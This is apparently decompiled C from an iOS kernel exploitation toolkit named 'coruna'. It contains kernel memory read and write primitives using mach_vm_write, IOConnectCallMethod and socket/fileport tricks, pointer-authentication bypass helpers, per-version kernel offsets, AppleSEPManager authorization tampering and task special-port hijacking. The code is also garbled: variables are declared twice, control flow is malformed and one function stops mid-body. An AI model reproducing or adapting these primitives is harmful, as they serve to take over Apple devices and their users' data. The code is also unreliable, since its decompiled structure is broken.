          coruna_kernel5_via_open_dev_null(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
          return;
        }
      }
      _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch,
                     *(mach_msg_type_number_t *)(handle + 0x168));
      thread_attr = coruna_u64_pack((thread_attr), (7));
      _mach_vm_machine_attribute
                (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),1,
                 (vm_machine_attribute_val_t *)&thread_attr);
    }
    else {
      coruna_kernel5_via_ioconnectcallscalarmethod(handle,arg,val);
    }
  }
  else {
    coruna_ioconnectcallmethod_1c8a8(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8(void)
{
  coruna_mach_vm_machine_attribute_1d4f8();
  return;
}
void coruna_kernel5_via_mach_port_deallocate_2b24c_2(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint8_t scratch[32];
  unsigned long bootargs;
  long thread_attr [8];
  
  thread_attr[6] = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  thread_attr[5] = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  err = coruna_kernel5_via_kernel5_via_pacia_12_6(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if (err != 0) {
    err = coruna_mach_make_memory_entry_2aed0(handle,bootargs & 0xffffffffc000,thread_attr);
    if (err == 0) {
      *(uint64_t *)((*(unsigned long *)(handle + 0x188) & arg) + thread_attr[0]) = val;
    }
    if (thread_attr[0] != 0) {
      coruna_mach_port_deallocate_2b24c(handle,thread_attr);
    }
  }
  return;
}
void coruna_ret_stub_7(void)
{
  coruna_kernel5_via_mach_vm_machine_attribute_1e01c();
  return;
}
void coruna_kernel5_residual_259(uint64_t val,int flags)
{
  uint8_t scratch[4];
  
  if ((flags != 0) && (-1 < flags)) {
    coruna_kernel5_via_pacia_12_20(val,0,scratch);
  }
  return;
}
void coruna_kernel5_via_pacia_12_12(long handle,unsigned long arg,uint *size)
{
  unsigned long u;
  int err;
  unsigned long size;
  uint version;
  long handle;
  
  err = coruna_pacia_12(handle,0x5584001);
  if (err == 0) {
    version = (uint)(ushort)(arg >> 0x30);
    if ((arg & 0x800000000000) != 0) {
      version = (uint)((arg >> 0x30) << 0xe);
    }
    *size = version;
  }
  else {
    err = coruna_pacia_12(handle,8);
    if ((err == 0) && (err = coruna_pacia_12(handle,0x5000000), err == 0)) {
      size = *(unsigned long *)(handle + 0x158);
      handle = 0x25;
      if (0x225814018fffff < size) {
        handle = 0x26;
      }
    }
    else {
      size = *(unsigned long *)(handle + 0x158);
      handle = 0x2d;
      if (0x225814018fffff < size) {
        handle = 0x2e;
      }
    }
    u = 3;
    if (0x225814018fffff < size) {
      u = 1;
    }
    u = u & arg >> handle;
    if (u == 0) {
      version = ((uint)arg & 0x3fff) << 0xe;
    }
    else {
      if (0x225814018fffff < size) {
        u = arg & 0x10 | 0x20;
      }
      version = (uint)(u << (arg & 0xf));
    }
    *size = version;
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel5_via_helper_5d2c_32264(handle,val,size_3,id_2);
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1b580(handle,val,size_3,id_2);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel5_via_u64_pack(handle,val,size_3,id_2);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
                   *(uint32_t *)(handle + 0x178),size_3,0);
    }
    else {
      coruna_kernel5_via_kernel5_via_thread_get_state(handle,val,size_3,id_2);
    }
  }
  else {
    coruna_ioconnectcallmethod(handle,val,size_3,id_2);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(void)
{
  coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3();
  return;
}
void coruna_kernel5_via_mach_vm_machine_attribute_1e01c(long handle)
{
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel5_via_helper_5d2c_32264();
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1bf8c();
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel5_via_open_dev_null();
          return;
        }
      }
      coruna_mach_vm_machine_attribute_1e01c(*(uint32_t *)(&k_kernel_slot_1918 + handle));
    }
    else {
      coruna_kernel5_via_thread_switch();
    }
  }
  else {
    coruna_ioconnectcallmethod_1c8a8();
  }
  return;
}
void coruna_kernel5_via_kernel5_via_mach_vm_machine_attribute_1e01c(void)
{
  coruna_kernel5_via_mach_vm_machine_attribute_1e01c();
  return;
}
void coruna_kernel5_via_vm_deallocate_112cc(long handle,long addr_2,uint64_t val)
{
  int err;
  uint32_t scratch;
  
  scratch = (uint32_t)val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_pacia_12(handle,0x5184001);
    if (err != 0) {
      coruna_vm_deallocate_112cc(handle,addr_2,&scratch,4);
      return;
    }
    addr_2 = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_pacia_5_2_3(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  coruna_mach_vm_machine_attribute(handle,addr_2,val);
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_semaphore_timedwait_2(long handle,long addr_2,uint64_t val)
{
  uint8_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = *(uint8_t *)(handle + 0xc);
  }
  else {
    err = coruna_pacia_12(handle,0x5184001);
    if (err != 0) {
      coruna_kernel5_via_kernel5_via_semaphore_timedwait_2(handle,addr_2,val);
      return;
    }
    addr_2 = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_pacia_5_2_3(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
    u = *(uint8_t *)(handle + 0xc);
  }
  coruna_mach_vm_machine_attribute_1d4f8(handle,addr_2,val,u);
  return;
}
void coruna_kernel5_via_vm_deallocate_112cc_2(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  int err;
  
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_pacia_12(handle,0x5184001);
    if (err != 0) {
      coruna_vm_deallocate_112cc(handle,addr_2,val,id_2);
      return;
    }
    addr_2 = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_pacia_5_2_3(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,addr_2,val,id_2,1);
  return;
}
void coruna_mach_vm_machine_attribute_1e01c(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint size,uint flags_2)
{
  uint u;
  uint dataCnt;
  kern_return_t lk2;
  long handle;
  uint size;
  vm_machine_attribute_val_t scratch;
  
  u = size;
  if (flags_2 != 0) {
    u = flags_2;
  }
  if (size != 0) {
    handle = 0;
    size = size;
    do {
      dataCnt = size;
      if (u <= size) {
        dataCnt = u;
      }
      lk2 = _mach_vm_write(arg,handle + arg_x,handle + handle,dataCnt);
      if (lk2 != 0) {
        return;
      }
      handle = handle + (unsigned long)dataCnt;
      size = size - dataCnt;
    } while (size != 0);
  }
  scratch = 7;
  _mach_vm_machine_attribute(arg,arg_x,(unsigned long)size,1,&scratch);
  return;
}
void coruna_mach_port_get_attributes(long handle)
{
  mach_port_name_t name;
  uint8_t *ptr;
  uint8_t *buf;
  int err;
  kern_return_t lk4;
  long handle;
  unsigned long u;
  mach_msg_type_number_t scratch;
  integer_t bootargs [3];
  int thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint32_t serial_buf;
  mach_msg_type_number_t action;
  ipc_info_tree_name_array_t block_ctx;
  mach_msg_type_number_t stack_guard;
  ipc_info_name_array_t sa_saved;
  ipc_info_space_t sa_new;
  ipc_space_t path_buf;
  
  if ((handle != 0) && (*(int *)k_kernel_bootstrap_port_slot + 1U < 2)) {
    path_buf = 0;
    err = coruna_call_mach_port_mod_refs_2e15c(handle,1,&path_buf);
    if (err != 0) {
      sa_new.iis_genno_mask = 0;
      sa_new.iis_table_size = 0;
      sa_new.iis_table_next = 0;
      sa_new.iis_tree_size = 0;
      sa_new.iis_tree_small = 0;
      sa_new.iis_tree_hash = 0;
      sa_saved = (ipc_info_name_array_t)0x0;
      stack_guard = 0;
      block_ctx = (ipc_info_tree_name_array_t)0x0;
      action = 0;
      lk4 = _mach_port_space_info(path_buf,&sa_new,&sa_saved,&stack_guard,&block_ctx,&action);
      buf = k_kernel_mach_task_self_slot;
      if ((lk4 == 0) && (stack_guard != 0)) {
        handle = 0;
        u = 0;
        do {
          serial_buf = 0;
          thread_attr = 0;
          host_info = 0;
          serial_buf = 0;
          host_info = 0;
          ghidra_stack_1 = 0;
          bootargs[0] = 0;
          bootargs[1] = 0;
          bootargs = 0;
          scratch = 0;
          scratch = 0x11;
          if (((((*(byte *)((long)&sa_saved->iin_type + handle + 2) & 0x1f) != 0) &&
               (name = *(mach_port_name_t *)((long)&sa_saved->iin_name + handle), 1 < name + 1)) &&
              (lk4 = _mach_port_get_attributes(path_buf,name,7,bootargs,&scratch), lk4 == 0))
             && ((thread_attr == 0x80 && ((~host_info & 6) == 0)))) {
            if ((1 < *(int *)((long)&sa_saved->iin_name + handle) + 1U) &&
               ((handle = coruna_kernel5_via_kernel5_via_mach_ports_register_2(handle,path_buf), ptr = k_kernel_bootstrap_port_slot,
                handle != 0 &&
                (err = coruna_mach_port_request_notification(handle,handle,k_kernel_bootstrap_port_slot), err == 0)))) {
              _task_set_special_port(*(task_t *)buf,4,*(mach_port_t *)ptr);
            }
            break;
          }
          u = u + 1;
          handle = handle + 0x1c;
        } while (u < stack_guard);
      }
      if ((sa_saved != (ipc_info_name_array_t)0x0) && (stack_guard != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)sa_saved,(unsigned long)stack_guard * 0x1c);
      }
      if ((block_ctx != (ipc_info_tree_name_array_t)0x0) && (action != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)block_ctx,(unsigned long)action * 0x24);
      }
      _mach_port_deallocate(*(ipc_space_t *)buf,path_buf);
    }
  }
  return;
}
void coruna_semaphore_timedwait(long handle,uint size)
{
  _semaphore_timedwait
            (*(semaphore_t *)(handle + 0x264),
             (mach_timespec_t)
             ((unsigned long)size / 1000000 | (unsigned long)((size % 1000000) * 1000 >> 3) << 0x23));
  return;
}
void coruna_mach_port_deallocate_1e398(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  long handle;
  long addr;
  sockaddr scratch;
  uint64_t scratch;
  uint64_t bootargs;
  long bootargs;
  mach_port_name_t thread_attr;
  
  addr = *(long *)(handle + 0x28);
  if (addr == 0) {
    return;
  }
  thread_attr = 0;
  err = _socket(0x20,2,2);
  if (-1 < err) {
    scratch.sa_data[6] = '\0';
    scratch.sa_data[7] = '\0';
    scratch.sa_data[8] = '\0';
    scratch.sa_data[9] = '\0';
    scratch.sa_data[10] = '\0';
    scratch.sa_data[0xb] = '\0';
    scratch.sa_data[0xc] = '\0';
    scratch.sa_data[0xd] = '\0';
    bootargs = 0;
    scratch = 0;
    scratch.sa_len = '\0';
    scratch.sa_family = '\0';
    scratch.sa_data[0] = '\0';
    scratch.sa_data[1] = '\0';
    scratch.sa_data[2] = '\x02';
    scratch.sa_data[3] = '\0';
    scratch.sa_data[4] = '\0';
    scratch.sa_data[5] = '\0';
    status = _connect(err,&scratch,0x20);
    if ((status == 0) && (status = coruna_fileport_makeport(err,&thread_attr), status == 0)) {
      u = coruna_kernel5_via_pacia_19(handle,thread_attr,&bootargs);
      if (u == 0) {
        status = coruna_kernel5_residual_257(handle,bootargs + 0x10,&bootargs);
        u = 0x2800f;
        if (status != 0) {
          handle = coruna_pacia(handle,bootargs);
          if (handle != 0) {
            status = coruna_kernel5_residual_257(handle,bootargs + 0x30,&bootargs);
            u = 0x2800f;
            if (status == 0) goto fail;
            handle = coruna_pacia(handle,bootargs);
            if (handle != 0) {
              u = 0;
              *(int *)(addr + 0x10) = err;
              *(long *)(addr + 0x18) = bootargs;
              goto fail;
            }
          }
          u = 0x28026;
        }
      }
      goto fail;
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  if (1 < thread_attr + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
    thread_attr = 0;
  }
  if (u == 0 || err == -1) {
    *(uint *)(addr + 0x3c) = u;
    if (u == 0) {
      u = 0xad001;
      do {
        err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
        if (err != 0) {
done:
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return;
            }
          }
        }
        if (*(char *)(addr + 0x38) != '\0') {
          u = 0;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return;
            }
          }
        }
        if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
           {
             *(uint *)(addr + 0x3c) = u;
             if (*(char *)(addr + 0x38) != '\0') {
             return;
             }
           }
        scratch = *(long *)(addr + 0x20) + -0x30;
        err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
        if (err == 0) break;
        bootargs = **(long **)(addr + 0x28);
        err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
        {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
          u = *ptr;
          }
          u = u | 0x40000000;
          {
          *(uint *)(addr + 0x3c) = u;
          if (*(char *)(addr + 0x38) != '\0') {
          return;
          }
          }
        }
        scratch.sa_len = '\0';
        scratch.sa_family = '\0';
        scratch.sa_data[0] = '\0';
        scratch.sa_data[1] = '\0';
        scratch.sa_data[2] = '\0';
        scratch.sa_data[3] = '\0';
        scratch.sa_data[4] = '\0';
        scratch.sa_data[5] = '\0';
        err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return;
      }
    }
  }
  else {
    _close(err);
    *(uint *)(addr + 0x3c) = u;
  }
  _semaphore_signal(*(semaphore_t *)(addr + 0xc));
  return;
}
void coruna_open_sepmgr_1e638(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  int err;
  long addr;
  unsigned long u;
  long scratch;
  
  u = (unsigned long)*(uint *)(handle + 0x10);
  if (*(uint *)(handle + 0x10) + 1 < 2) {
    u = coruna_ioservicegetmatchingservice_1a3ec("AppleSEPManager");
    if ((int)u + 1U < 2) {
      return;
    }
    *(int *)(handle + 0x10) = (int)u;
  }
  addr = *(long *)(handle + 0x18);
  if (addr == 0) {
    addr = coruna_kernel5_via_kernel5_via_pacia_5(handle,u);
    if (addr == 0) {
      return;
    }
    *(long *)(handle + 0x18) = addr;
  }
  handle = *(long *)(handle + 0x20);
  if (*(long *)(handle + 0x20) == 0) {
    err = coruna_kernel5_residual_257(handle,addr + 0x28,&scratch);
    if (err == 0) {
      return;
    }
    *(long *)(handle + 0x20) = scratch;
    handle = scratch;
  }
  scratch = handle;
  err = coruna_mach_vm_machine_attribute_1d4f8(handle,addr + 0x28,val,0);
  if (err != 0) {
    err = __IOServiceSetAuthorizationID(u,id_2);
    if ((err != 0) && (err == 0x35)) {
      if (*(char *)(handle + 0xc) == '\0') {
        err = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_thread_get_state_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
      }
      else {
        *(uint8_t *)(handle + 0xc) = 0;
        err = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_thread_get_state_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
        *(uint8_t *)(handle + 0xc) = 1;
      }
      if (err == 0) {
        __IOServiceSetAuthorizationID(u,id_2);
      }
    }
    coruna_mach_vm_machine_attribute_1d4f8(handle,addr + 0x28,scratch,0);
  }
  return;
}
void coruna_kernel5_via_ret_stub_6(long handle,uint64_t val,long *addr_2,byte arg,long *off_3)
{
  uint64_t u;
  unsigned long size;
  unsigned long *ptr;
  unsigned long version;
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long sa_saved;
  unsigned long sa_new;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t url_buf;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  handle = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_5();
  addr = 0;
  {
    if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
    }
    ___stack_chk_fail(addr);
  }
  err = coruna_kernel5_residual_260(handle,(long)&block_ctx + 4,&block_ctx);
  if ((err != 0) &&
     (err = coruna_kernel5_residual_257(handle,handle + (block_ctx >> 0x20),&action),
     err != 0 && action != 0)) {
    if (addr_2 == (long *)0x0) {
      err = coruna_ret_stub_6(handle,handle + (block_ctx & 0xffffffff),8,&serial_buf);
      if (err == 0) goto done;
    }
    else {
      serial_buf = *addr_2;
    }
    err = coruna_kernel5_residual_261(handle,&bootargs,&scratch);
    if (((err != 0) &&
        (err = coruna_kernel5_residual_257(handle,action + (unsigned long)bootargs,&host_info), err != 0)) &&
       (host_info != 0)) {
      if (off_3 != (long *)0x0) {
        *off_3 = host_info + (unsigned long)scratch;
      }
      err = coruna_kernel5_residual_257(handle,host_info + (unsigned long)scratch,&thread_attr);
      addr = 0;
      if ((err != 0) && (thread_attr != 0)) {
        do {
          json_buf = 0;
          plist = 0;
          url_buf = 0;
          json_buf = 0;
          url_buf = 0;
          path_buf = 0;
          plist = 0;
          region = 0;
          tmp_buf = 0;
          stack_guard = 0;
          region = 0;
          sa_new = 0;
          sa_saved = 0;
          serial_buf = 0;
          tmp_buf = 0;
          block_ctx = 0;
          action = 0;
          thread_attr = 0;
          sa_new = 0;
          path_buf = 0;
          host_info = 0;
          u = 0x40;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            u = 0x30;
          }
          scratch = 0;
          stack_guard = 0;
          sa_saved = 0;
          bootargs = 0;
          err = coruna_ret_stub_6(handle,thread_attr,u,&stack_guard);
          if (err == 0) goto done;
          size = thread_attr;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            size = sa_saved;
          }
          addr = thread_attr;
          if ((arg & addr_2 == (long *)0x0) == 0) {
            ptr = &host_info;
            version = path_buf;
            if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
              ptr = &sa_new;
              version = thread_attr;
            }
            if (*ptr <= serial_buf - size && serial_buf - size < version) break;
          }
          else if (size - 0x20000000 < 0x7fe0000001) break;
          err = coruna_kernel5_residual_257(handle,thread_attr,&thread_attr);
          addr = 0;
          if ((err == 0) || (thread_attr == 0)) break;
        } while( true );
      }
      {
        if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
        return;
        }
        ___stack_chk_fail(addr);
      }
    }
  }
done:
  addr = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
  }
  ___stack_chk_fail(addr);
}
void coruna_kernel5_residual_260(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  uint32_t u;
  uint32_t size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x240;
      u = 0x238;
    }
    else if (err == 0x1c1b) {
      size = 0x228;
      u = 0x220;
    }
    else {
      if (err != 0x1f53) {
        return;
      }
      u = 0x358;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2a8;
      }
      size = 0x360;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x2b0;
      }
    }
  }
  else if (err < 0x225c) {
    if (err != 0x1f54 && err != 0x2258) {
      return;
    }
    size = 0x358;
    u = 0x350;
  }
  else {
    if (err != 0x225c && err != 0x2712) {
      return;
    }
    size = 0x550;
    u = 0x548;
  }
  *size = u;
  *flags_2 = size;
  return;
}
void coruna_kernel5_residual_261(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  bool err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (size != (uint32_t *)0x0) {
      *size = 0x78;
    }
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = 0x50;
    }
  }
  return;
}
void coruna_cc_sha256_update(int flags,void *ctx,CC_LONG arg,void *scratch,uint *size)
{
  uint u;
  CC_SHA512_CTX CStack_148;
  uchar scratch [48];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0x14;
  if (flags < 3) {
    if (flags != 1) {
      if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
      ___stack_chk_fail();
      }
      return;
    }
  }
  else if (flags != 3) {
    if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail();
    }
    return;
  }
  if (u <= *size) {
    if (flags - 2U < 2) {
      _CC_SHA256_Init((CC_SHA256_CTX *)&CStack_148);
      _CC_SHA256_Update((CC_SHA256_CTX *)&CStack_148,ctx,arg);
      _CC_SHA256_Final(scratch,(CC_SHA256_CTX *)&CStack_148);
    }
    else if (flags == 4) {
      _CC_SHA384_Init(&CStack_148);
      _CC_SHA384_Update(&CStack_148,ctx,arg);
      _CC_SHA384_Final(scratch,&CStack_148);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
      ___stack_chk_fail();
      }
      return;
void coruna_cfrelease(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 long *handle,uint64_t *off_5,uint64_t off_6)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  
  handle = coruna_cfreadstreamcreatewithbytesnocopy();
  if (handle != 0) {
    addr = coruna_cfreadstreamcreatewithbytesnocopy(size_3,off_4);
    if (addr != 0) {
      err = coruna_kernel5_via_cfdictionaryapplyfunction_1042c(handle,addr,off_6);
      if ((err != 0) && (off = coruna_cfpropertylistcreatedata(handle,&scratch), off != 0)) {
        *off_5 = scratch;
        *handle = off;
      }
      _CFRelease(handle);
      handle = addr;
    }
    _CFRelease(handle);
  }
  return;
}
void coruna_cfreadstreamcreatewithbytesnocopy(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFReadStreamCreateWithBytesNoCopy
                    (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
  if (handle == 0) {
    return;
  }
  err = _CFReadStreamOpen();
  _CFRelease(handle);
  return;
}
void coruna_kernel5_via_cfdictionaryapplyfunction_1042c(uint64_t val,uint64_t id_2,uint8_t *buf)
{
  int err;
  
  if (buf != (uint8_t *)0x0) {
    err = coruna_cfdictionaryapplyfunction_1042c(val,id_2);
    if (err == 0) {
      *buf = 1;
      return;
    }
    *buf = 0;
  }
  coruna_cfdictionaryapplyfunction(val,id_2);
  return;
}
void coruna_cfpropertylistcreatedata(uint64_t val,size_t *len)
{
  long handle;
  size_t ls2;
  void *ptr;
  void *buf;
  long scratch;
  
  scratch = 0;
  handle = _CFPropertyListCreateData
                    (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,100,0,&scratch);
  if (handle == 0) {
    handle = scratch;
    if (scratch == 0) {
      return;
    }
  }
  else {
    ls2 = _CFDataGetLength();
    if ((ls2 != 0) && (ptr = _malloc(ls2), ptr != (void *)0x0)) {
      buf = (void *)_CFDataGetBytePtr(handle);
      _memcpy(ptr,buf,ls2);
      *len = ls2;
    }
  }
  _CFRelease(handle);
  return;
}
void coruna_plist_dict(uint *size,uint64_t val,uint64_t *id_2)
{
  uint32_t u;
  uint size;
  uint version;
  uint port;
  bool err;
  uint64_t tag;
  uint64_t kind;
  char err;
  int err;
  long handle;
  long addr;
  void *ptr;
  void *buf;
  size_t ls15;
  uint64_t type_id;
  unsigned long type_id_8;
  char *ptr;
  char *buf;
  unsigned long type_id_9;
  unsigned long type_id_10;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  char *thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  char *stack_guard;
  uint type_id_11;
  
  err = coruna_kernel5_via_kernel5_residual_262_3(size,val,0,1,&scratch);
  if ((err == 0) && (err = coruna_kernel5_via_kernel5_residual_262_3(size,val,0,0,&scratch), err == 0)) {
    return;
  }
  type_id_8 = *(unsigned long *)(size + 0x56);
  if ((0x1c1b19145fffff < type_id_8) && ((*size & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_8)) {
    serial_buf = coruna_u64_pack71((serial_buf), (1));
  }
  if ((unsigned long)thread_attr >> 0x1d != 0) {
    handle = coruna_helper_16fd0_34c1c(size,host_info);
    if ((handle != 0) && (err = coruna_kernel5_residual_260(size,&block_ctx,&action), err != 0)) {
      handle = handle + (action & 0xffffffff);
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,handle,8,&stack_guard);
      coruna_kernel5_via_kernel5_via_bzero_5(&scratch);
      return;
    }
    coruna_kernel5_via_kernel5_via_bzero_5(&scratch);
    return;
  }
  handle = coruna_kernel5_residual_262(&scratch,host_info & 0xffffffff,0xfade0c02);
  coruna_kernel5_via_kernel5_via_bzero_5(&scratch);
  return;
}
